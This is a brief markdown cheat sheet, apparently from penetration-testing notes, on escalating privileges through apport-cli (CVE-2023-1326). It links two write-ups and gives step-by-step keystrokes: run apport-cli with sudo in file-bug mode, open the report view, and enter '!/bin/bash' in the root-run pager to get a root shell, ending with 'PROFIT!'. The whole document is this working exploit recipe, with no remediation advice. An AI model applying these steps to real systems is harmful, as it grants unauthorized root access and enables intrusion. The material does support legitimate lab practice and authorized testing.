# Apport-cli Privesc

## Resources: 

### 1) https://vk9-sec.com/cve-2023-1326privilege-escalation-apport-cli-2-26-0/

### 2) https://github.com/diego-tella/CVE-2023-1326-PoC

# With sudo:

## Steps:

 - sudo /usr/bin/apport-cli -v (Check version)

 - sudo /usr/bin/apport-cli --file-bug (Enter debug mode)

 - Choose 1

 - Choose 2

 - Press V

 - Enter !/bin/bash to execute an elevated bash shell (Opens a less page as root)

 - PROFIT!
